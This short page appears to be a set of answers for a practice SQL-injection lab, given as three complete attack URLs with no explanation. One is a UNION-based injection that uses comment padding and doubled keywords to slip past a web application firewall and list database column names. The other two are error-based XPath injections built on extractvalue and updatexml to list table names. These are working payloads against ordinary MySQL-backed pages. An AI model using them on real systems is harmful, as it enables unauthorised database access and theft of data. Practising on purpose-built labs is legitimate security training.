# [MAIN PAGE](http://root0x00.altervista.org/sqli/)

## WAF BYPASS LEVEL 3 MEDIUM~MEDIUM
```
http://root0x00.altervista.org/sqli/level1.php?id=11%27/**/Ununionion/**/seselectlect/**/1,2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=%27BlueMilkshake_0
```

## XPATH LEVEL 1

```
http://root0x00.altervista.org/sqli/xpath.php?id=1%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))--+
```

## XPATH LEVEL 2
```
http://root0x00.altervista.org/sqli/xpath2.php?id=1%27%20and%20updatexml(null,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())),null)--+
```
